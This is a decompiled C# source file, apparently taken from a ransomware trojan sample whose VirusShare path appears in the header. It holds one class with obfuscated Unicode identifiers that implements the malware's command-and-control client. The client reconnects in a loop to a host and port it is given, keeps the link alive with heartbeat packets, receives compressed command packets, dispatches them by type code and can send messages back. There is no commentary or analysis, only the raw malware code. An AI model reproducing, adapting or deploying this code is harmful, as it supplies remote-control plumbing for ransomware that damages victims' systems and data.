// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ᆙסю៛឵ኧಋྩ࿕ူǕߋዹো
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  internal class ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো
  {
    private Socket Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977;
    private bool \u0009ᡓിᒐÞᒸ;
    private Thread \u0B97ޤ\u1CFFᣵȔỦਓዦᦣṭΏ;
    private Thread \u0CBFø\u0E73ঝŮʀᰄᰝ;
    private Thread ᔜᡪఒཧɧՑᴨ\u1ADFऎᖆᴵ\u0E93ᖙӨ\u066Bᛉ;
    private string ใẑ\u19FCᘆϪጙࠅՍಷƜვຶ\u0BD1;
    private int Й\u17DBᚁᖻ\u0E7Aწ\u098DỬᦔఫᝇ႕ࣦ;
    private string ᣙᙥ᭐ࠇሔྰ\u137D;
    private bool ȡďᄱՑЍਚᓰε\u0C52\u0C29ᱼͷᤛᗷṘ\u0E6Cᜱל;

    public ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো(string Host, int Port, string Password)
    {
      this.ใẑ\u19FCᘆϪጙࠅՍಷƜვຶ\u0BD1 = Host;
      this.Й\u17DBᚁᖻ\u0E7Aწ\u098DỬᦔఫᝇ႕ࣦ = Port;
      this.ᣙᙥ᭐ࠇሔྰ\u137D = Password;
      this.\u0009ᡓിᒐÞᒸ = false;
      this.ȡďᄱՑЍਚᓰε\u0C52\u0C29ᱼͷᤛᗷṘ\u0E6Cᜱל = false;
    }

    public Socket Ḛ֨ͩ\u02EAᮑᯅຫۺӧ́ => this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977;

    public bool ǟᴄᴑݫہɹṫঔหʣȿຂዋ̩ => this.\u0009ᡓിᒐÞᒸ;

    public string \u065F\u1754ࡇ᯲᩿௫ၮጀ\u1AAE => this.ใẑ\u19FCᘆϪጙࠅՍಷƜვຶ\u0BD1;

    public int ᒏ၁ǦમȊ\u0F0Aڃೕᅇ\u0EFF\u1C4A\u0DF8ᦲனᐌ\u1C8D\u1739 => this.Й\u17DBᚁᖻ\u0E7Aწ\u098DỬᦔఫᝇ႕ࣦ;

    public string \u0829ᯚᙦ\u0FDDἁ\u1316ᕦᚗᷲދࠅޙႱ\u0A04ɣసᅲ => this.ᣙᙥ᭐ࠇሔྰ\u137D;

    public void \u17BE\u0EE4Уфᘱഐຄӈ() => this.ᔣᒾᓶ\u1BF6ᨓᏍᴉ\u0A44Ắឳሯᘀ\u0382Ṟಛ\u17EFႶ೭ᄯ();

    private void ᔣᒾᓶ\u1BF6ᨓᏍᴉ\u0A44Ắឳሯᘀ\u0382Ṟಛ\u17EFႶ೭ᄯ()
    {
      if (this.\u0009ᡓിᒐÞᒸ)
        return;
      this.ᔜᡪఒཧɧՑᴨ\u1ADFऎᖆᴵ\u0E93ᖙӨ\u066Bᛉ = new Thread((ThreadStart) (() =>
      {
        this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        while (!this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Connected)
        {
          try
          {
            this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Connect(this.ใẑ\u19FCᘆϪጙࠅՍಷƜვຶ\u0BD1, this.Й\u17DBᚁᖻ\u0E7Aწ\u098DỬᦔఫᝇ႕ࣦ);
          }
          catch
          {
            Thread.Sleep(TimeSpan.FromSeconds((double) \u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ጔ\u197DẒᕡ\u1C9E᪰ዹᮮᅜਤϛஅΉშᗳ\u1A1Fᚵઌళ));
          }
        }
        this.ōᕛ\u05ED̔ęḉ();
      }));
      this.ᔜᡪఒཧɧՑᴨ\u1ADFऎᖆᴵ\u0E93ᖙӨ\u066Bᛉ.Start();
    }

    private void ōᕛ\u05ED̔ęḉ()
    {
      if (this.\u0009ᡓിᒐÞᒸ)
        return;
      this.\u0009ᡓിᒐÞᒸ = true;
      if (this.ທӼැ᷿ኔਲ਼ɫள == null)
        return;
      this.ທӼැ᷿ኔਲ਼ɫள((object) this, (EventArgs) null);
    }

    public void ᙕแᆵᑨحŻ͝ᇧᵺᐔଁ()
    {
      this.\u0B97ޤ\u1CFFᣵȔỦਓዦᦣṭΏ = new Thread(new ThreadStart(this.ᣃǝộ֤ߜΫᶐƠႝᔜİᶁ));
      this.\u0B97ޤ\u1CFFᣵȔỦਓዦᦣṭΏ.Start();
      this.\u0CBFø\u0E73ঝŮʀᰄᰝ = new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          Thread.Sleep(TimeSpan.FromSeconds(45.0));
          if (this.ȡďᄱՑЍਚᓰε\u0C52\u0C29ᱼͷᤛᗷṘ\u0E6Cᜱל)
            this.ȡďᄱՑЍਚᓰε\u0C52\u0C29ᱼͷᤛᗷṘ\u0E6Cᜱל = false;
          else
            break;
        }
        this.\u09D6ѷ\u0831ᆾ\u1C9FἎ\u17EDûрؕӓ\u1257Ί\u007E\u1AD5ఓț\u09FE\u09FA(true);
      }));
      this.\u0CBFø\u0E73ঝŮʀᰄᰝ.Start();
    }

    private void ᣃǝộ֤ߜΫᶐƠႝᔜİᶁ()
    {
      try
      {
        MemoryStream ms = new MemoryStream();
        byte[] array;
        do
        {
          array = new byte[this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.ReceiveBufferSize];
          int num = this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Receive(array, 0, array.Length, SocketFlags.Partial);
          if (num <= 0)
            throw new SocketException();
          Array.Resize<byte>(ref array, num);
          ms.Write(array, 0, num);
        }
        while (!(char.ConvertFromUtf32((int) array[array.Length - 1]) == "\n"));
        ms.Close();
        new Thread((ThreadStart) (() =>
        {
          this.ᓝᅇ\u187E߫Ձ\u05ECش(ms.ToArray());
          ms.Dispose();
          ms = (MemoryStream) null;
        })).Start();
      }
      catch (SocketException ex)
      {
        this.\u09D6ѷ\u0831ᆾ\u1C9FἎ\u17EDûрؕӓ\u1257Ί\u007E\u1AD5ఓț\u09FE\u09FA(true);
        return;
      }
      catch (Exception ex)
      {
        this.\u09D6ѷ\u0831ᆾ\u1C9FἎ\u17EDûрؕӓ\u1257Ί\u007E\u1AD5ఓț\u09FE\u09FA(true);
        Console.WriteLine(ex.Message);
      }
      this.ᣃǝộ֤ߜΫᶐƠႝᔜİᶁ();
    }

    private void ᓝᅇ\u187E߫Ձ\u05ECش(byte[] _param1)
    {
      List<byte> byteList = new List<byte>();
      for (int index = 0; index < _param1.Length; ++index)
      {
        if (char.ConvertFromUtf32((int) _param1[index]) != "\n")
        {
          byteList.Add(_param1[index]);
        }
        else
        {
          this.\u1AABᯈٌ\u1AEB\u0E77(byteList.ToArray());
          byteList.Clear();
        }
      }
    }

    private void \u1AABᯈٌ\u1AEB\u0E77(byte[] _param1)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᮍΐฝᬺދᆙ໔(_param1, true));
        byte[] buffer = new byte[4];
        memoryStream.Read(buffer, 0, buffer.Length);
        ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ int32 = (ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ) BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[memoryStream.Length - 4L];
        memoryStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        memoryStream.Dispose();
        if (int32 != ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ.\u1BF2᮴ᯂɪᖊᇻࡆϟಹ\u0EF8ᰂࡘᮚ\u0A55આ̸ޠ)
        {
          if (this.\u1390ɐᷝᩝƢᶧẞᵩ\u0385྇Ĝӥቴ\u003Cࣦৢ != null)
            this.\u1390ɐᷝᩝƢᶧẞᵩ\u0385྇Ĝӥቴ\u003Cࣦৢ((object) this, new ᆹἜ\u0A78\u08BE๎\u0BFBᕟԾӖಁപ\u1A7DẦĸᶊ(numArray, numArray.Length, int32));
        }
        else
        {
          this.ȡďᄱՑЍਚᓰε\u0C52\u0C29ᱼͷᤛᗷṘ\u0E6Cᜱל = true;
          this.ᤇᴗៜᕯࢲᦹфיଇἘᖼӼϬ\u0C64௭ṛଏ();
        }
        _param1 = (byte[]) null;
      }
      catch
      {
        ጯӰᐾ\u0A63ŶᓘभƎ ጯӰᐾŶᓘभƎ = new ጯӰᐾ\u0A63ŶᓘभƎ();
        ጯӰᐾŶᓘभƎ.Write("Broken Packet");
        this.ᓣፈཏि\u1CB5ළሑྂहோḑᮎ\u1B5Fጿ(new ᗊ\u1A8CᰈՈଇ᩠ഌ(ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ.ᖃᇀຊകԄسႄ\u03A2\u02FE\u0AD5ʗ, ጯӰᐾŶᓘभƎ.Â\u0F14\u0DE2֬лᙕᶥ͍੪ذნؑຯబᩐப\u0FFF\u0AD6\u0D70()).Βლᖾṋ̦\u0382עᶙ());
      }
    }

    public int ᓣፈཏि\u1CB5ළሑྂहோḑᮎ\u1B5Fጿ(byte[] _param1)
    {
      try
      {
        int sent = this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Send(_param1, 0, _param1.Length, SocketFlags.Partial) + this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Send(this.\u1C84ḥడዘ\u1AFCƭƄ\u1369ୱឧ᳡ᯞߥ, 0, 1, SocketFlags.Partial);
        if (this.ፘծாˢᝍೣဖషࡀӥ != null && sent != 0)
          this.ፘծாˢᝍೣဖషࡀӥ((object) this, new \u0610྇м೩ᰠԴᇭǷpୃ\u0590ᥘᖉɭѲ(sent));
        return sent;
      }
      catch
      {
        return 0;
      }
    }

    private byte[] \u1C84ḥడዘ\u1AFCƭƄ\u1369ୱឧ᳡ᯞߥ => Encoding.ASCII.GetBytes("\n");

    private void ᤇᴗៜᕯࢲᦹфיଇἘᖼӼϬ\u0C64௭ṛଏ() => this.ᓣፈཏि\u1CB5ළሑྂहோḑᮎ\u1B5Fጿ(new ᗊ\u1A8CᰈՈଇ᩠ഌ(ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ.\u1BF2᮴ᯂɪᖊᇻࡆϟಹ\u0EF8ᰂࡘᮚ\u0A55આ̸ޠ, new byte[0]).Βლᖾṋ̦\u0382עᶙ());

    public void \u0D6Fш१۹\u08C8ฤ̞\u1C8Bರጂݭᵋ(string _param1)
    {
      ጯӰᐾ\u0A63ŶᓘभƎ ጯӰᐾŶᓘभƎ = new ጯӰᐾ\u0A63ŶᓘभƎ();
      ጯӰᐾŶᓘभƎ.Write(_param1);
      this.ᓣፈཏि\u1CB5ළሑྂहோḑᮎ\u1B5Fጿ(new ᗊ\u1A8CᰈՈଇ᩠ഌ(ᆙסю\u17DB឵ኧಋྩ\u0FD5ူǕߋዹো.ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ.ᖃᇀຊകԄسႄ\u03A2\u02FE\u0AD5ʗ, ጯӰᐾŶᓘभƎ.Â\u0F14\u0DE2֬лᙕᶥ͍੪ذნؑຯబᩐப\u0FFF\u0AD6\u0D70()).Βლᖾṋ̦\u0382עᶙ());
    }

    public bool \u09D6ѷ\u0831ᆾ\u1C9FἎ\u17EDûрؕӓ\u1257Ί\u007E\u1AD5ఓț\u09FE\u09FA(bool ᆨࢫᆔۤʬ৫)
    {
      if (!this.\u0009ᡓിᒐÞᒸ)
        return false;
      this.ᠯᱡᏱ\u0F14\u05ECᩑ̌ᣗʽᕙᅠΏ();
      this.\u0009ᡓിᒐÞᒸ = false;
      if (ᆨࢫᆔۤʬ৫ && this.\u058B\u08CDᯢ\u1B60᷒ڧᖺᕱ\u0489ऩ\u0CDFẲ\u09FCᗟἘ != null)
        this.\u058B\u08CDᯢ\u1B60᷒ڧᖺᕱ\u0489ऩ\u0CDFẲ\u09FCᗟἘ((object) this, (EventArgs) null);
      return true;
    }

    public void ᠯᱡᏱ\u0F14\u05ECᩑ̌ᣗʽᕙᅠΏ()
    {
      try
      {
        this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977.Close();
        this.Ᏺᙍ\u0AD7ḓЌҲၿฐᒈલၘḷӐভᶍቆஔ\u0D79\u1977 = (Socket) null;
      }
      catch
      {
      }
      try
      {
        this.\u0B97ޤ\u1CFFᣵȔỦਓዦᦣṭΏ.Abort();
        this.\u0B97ޤ\u1CFFᣵȔỦਓዦᦣṭΏ = (Thread) null;
      }
      catch
      {
      }
      try
      {
        this.\u0CBFø\u0E73ঝŮʀᰄᰝ.Abort();
        this.\u0CBFø\u0E73ঝŮʀᰄᰝ = (Thread) null;
      }
      catch
      {
      }
    }

    public event EventHandler ConnectionAccepted;

    public event EventHandler Disconnected;

    public event EventHandler<\u0610྇м೩ᰠԴᇭǷpୃ\u0590ᥘᖉɭѲ> Sent;

    public event EventHandler<ᆹἜ\u0A78\u08BE๎\u0BFBᕟԾӖಁപ\u1A7DẦĸᶊ> Received;

    public enum ᠽ\u07FDқ\u0E5D\u0DF8ዡṻӄᗬ\u08D1ᶄ
    {
      ᢊʥ\u0E66́ȍ = 0,
      CJक़֘ຮạᖙ\u0AF5ᓖĚւ્Ἔഽ = 1,
      тᵒᔅ\u03F6Ἵ\u0CFF۱\u193Dᗧᆤ = 2,
      \u0C3Fл\u1CA2ث\u0F1Dᓦᗪ᮰ዛᢡәᯒѲڊឱG = 3,
      \u0982ሴ\u10C6\u1AF9ӿᒐᑈҒᢡṊ = 4,
      غᢑٌ\u12B1ጳ = 5,
      ቢᅞඓສᄽ\u0FDBᐣͬᦡᇖẨƀ႒\u1CABދ = 6,
      \u1ABDྺγÞᮐ݀\u0EEA࡙ƙᖻᗛ = 7,
      ᕵᦉቔᅨ\u089Eഎ\u1368ٓᇳᰊចɘᯣឍ = 8,
      ʺᓠ̒ࠎƟᧄᣂᴔᗑ\u0EFE = 9,
      \u17F7ྪጟᣬาȪጡ\u05ECซଽċઝាᮓ\u1AD6ሼ = 15, // 0x0000000F
      ᩓଢɳԹ\u0D11\u1AC2\u1940Hഷ\u0017ềിᠡ = 16, // 0x00000010
      \u0942ĸᨄᷲ\u1775Ś = 17, // 0x00000011
      Ѓᯢరኹ᷆ඬᐻ = 18, // 0x00000012
      \u1BF2᮴ᯂɪᖊᇻࡆϟಹ\u0EF8ᰂࡘᮚ\u0A55આ̸ޠ = 19, // 0x00000013
      Ҋវᢌ᷾Ṣᶜඣนᙏ = 20, // 0x00000014
      ᖃᇀຊകԄسႄ\u03A2\u02FE\u0AD5ʗ = 21, // 0x00000015
      ü\u1C98ൊ\u0EFA᪳ᡂߡᣭᅜࣸଙ\u1395ड = 22, // 0x00000016
      Éᴴ\u1C92ᵦᐇݰ\u1AECᤆගᨹm\u0EED͓ᕧᤑۣ9ᰊ = 23, // 0x00000017
      ጁᚠᬳႳཧ\u02E8ᒠظ = 24, // 0x00000018
      ᱣಋڧᨵϳ\u0865թ\u128Fُӗᘎᩦᔜܵ\u0EFBቐ\u0E8Cெ = 25, // 0x00000019
    }
  }
}
